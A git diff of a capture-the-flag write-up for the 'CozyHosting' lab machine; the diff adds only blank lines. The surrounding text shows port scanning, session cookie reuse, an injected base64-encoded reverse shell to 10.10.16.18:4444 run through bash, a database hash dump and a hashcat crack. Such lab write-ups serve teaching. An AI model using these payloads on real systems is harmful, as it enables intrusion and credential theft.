@@ -17,6 +17,7 @@ description:
 
 The machine is assigned IP address 10.10.11.230, let's scan the ports with Nmap:
 
+
 ```sh
 $ nmap -sV -sS -Pn -p1-65535 -oN 10.10.11.230 10.10.11.230
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 01:46 EDT
@@ -29,15 +30,20 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
+
 After going to http://10.10.11.230 we get the address cozyhosting.htb, which we will write in /etc/hosts.
+
 
 ```sh
 $ echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
 ```
 
+
 ## Web Service
 
+
 Let's use dirsearch to find interesting files.
+
 
 ```sh
 $ python3 dirsearch.py -u http://cozyhosting.htb
@@ -51,18 +57,23 @@ EEB6EBC6B06219C8009764BB6ACCF8DD	"UNAUTHORIZED"
 6155F2929B8D4814171410BE580B8215	"kanderson"
 ```
 
+
 In web-browser click: Inspect -> Storage -> Cookies - Replace to:
+
 
 ```sh
 ;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTgvNDQ0NCAwPiYxCg=="|base64${IFS}-d|bash;
 ```
 
+
 ## Reverse shell:
+
 
 ```sh
 $ echo "sh -i >& /dev/tcp/10.10.16.18/4444 0>&1" | base64
 c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTgvNDQ0NCAwPiYxCg==
 ```
+
 
 Let's start nc and send the request:
 
@@ -83,6 +94,7 @@ $ python3 -m http.server 8083
 10.10.16.18 - - [08/Sep/2023 10:29:07] "GET /favicon.ico HTTP/1.1" 404 -
 10.10.16.18 - - [08/Sep/2023 10:29:51] "GET /cloudhosting-0.0.1.jar HTTP/1.1" 200 -
 ```
+
 
 ## Exploring the application
 
@@ -153,12 +165,14 @@ SELECT * FROM users;
 (2 rows)
 ```
 
+
 #### Hash Identification (bcrypt):
 
 ```sh
 $ hashcat --help | grep 3200
    3200 | bcrypt $2*$, Blowfish (Unix)      
 ```
+
 
 Let's put the hash in the hash.txt file and run hashcat:
 
@@ -167,6 +181,7 @@ $ hashcat -m 3200 -a 0 hash.txt rockyou.txt
 hashcat (v6.1.1) starting...
 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
 ```
+
 
 Let's see what user is still on the system:
 
@@ -183,6 +198,7 @@ manchesterunited
 josh@cozyhosting:~$ cat user.txt
 ab5232bdddfdec1731346c7bd7e4e8cc
 ```
+
 
 ## Privilege escalation
 
